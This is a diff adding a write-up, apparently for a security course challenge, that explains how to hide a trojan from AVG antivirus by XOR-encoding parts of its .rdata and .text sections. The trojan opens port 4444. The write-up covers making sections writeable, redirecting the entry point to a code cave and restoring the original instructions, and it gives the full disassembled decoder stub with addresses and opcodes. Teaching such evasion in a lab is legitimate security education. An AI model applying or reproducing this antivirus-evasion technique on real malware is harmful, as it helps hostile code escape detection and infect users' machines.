@@ -1,0 +1,46 @@
+The goal of this challenge is to XOR encode enough of the executable so that AVG does not find a threat.  
+When encoding a piece of the .text section analogous to the coursework exercise, AVG still found a threat.  
+When additionally encoding a chunk of code in the .rdata section, AVG failed to find a threat.  
+
+The first step is to use a PE editor to edit the flags so that the .rdata section and the .text section are writeable.  
+The next step was to find a code cave that will house the XOR encoding stub.  It was found at 0x004018e0.  
+The program entry point at 0x401220 is replaced with a jump to the code cave.  
+When saving changes, the extra NOP must also be highlighted.
+
+After jumping to the code cave, the first instruction is to set EAX to the address of 
+the beginning of the .rdata section, which is 0x004030000.  Address 0x004031fe was chosen 
+as the last byte to XOR.  A loop is setup to XOR every byte between 0x004030000 and 0x004031fe is 
+reached.  This process is repeated with the relevant portion of the .text section.  
+The code between 0x00401225 and 0x004018df was chosen to XOR.  This is the section after 
+the initial jump to the code cave, up to the start of the code cave.
+
+A break point was set at the point after the two loops complete, the loops were 
+executed, and the changes were saved.  Two saves were necessary, one for the changes in the 
+.rdata section, and another for the changes to the .text section.  
+
+The final steps were to add instructions that were replaced by the initial jump to the code cave, 
+and a jump instruction that goes back to the normal execution of the trojan.
+
+When this modified trojan is executed, it will XOR the changed sections of .rdata back to 
+normal, do the same with the changed sections of .text, and continue with normal execution to open port 4444.
+
+The code below represents the changes needed to thwart AVG detection.
+
+00401220 T> $ /E9 BB060000      JMP Trojan-j.004018E0  //jump to codecave
+.
+.
+.
+004018E0    B8 00304000      MOV EAX,Trojan-j.00403000 //set eax to start of .rdata section
+004018E5    8030 0F          XOR BYTE PTR DS:[EAX],0F //xor byte in .rdata section
+004018E8    40               INC EAX       //increase eax 
+004018E9    3D FE314000      CMP EAX,Trojan-j.004031FE     //check if we are at end of .rdata section 
+004018EE    7E F5          JLE SHORT Trojan-j.004018E5 //jump back if we are not at end of .rdata section
+004018F0    B8 25124000      MOV EAX,Trojan-j.00401225 //set eax to start of .text section to xor
+004018F5    8030 0F          XOR BYTE PTR DS:[EAX],0F //xor byte in .text section
+004018F8    40               INC EAX                                //increase eax
+004018F9    3D DF184000      CMP EAX,Trojan-j.004018DF //check to see if we are at end of .text section
+004018FE    7E F5            JLE SHORT Trojan-j.004018F5 //jump back if we are not at end of .text section
+00401900    55               PUSH EBP  //original instruction that we replaced with initial jump
+00401901    8BEC             MOV EBP,ESP //original instruction that we replaced with initial jump
+00401903    83EC 08          SUB ESP,8 //original instruction that we replaced with initial jump
+00401906    E9 1AF9FFFF      JMP Trojan-j.00401225 //jump back to continue normal execution of trojan
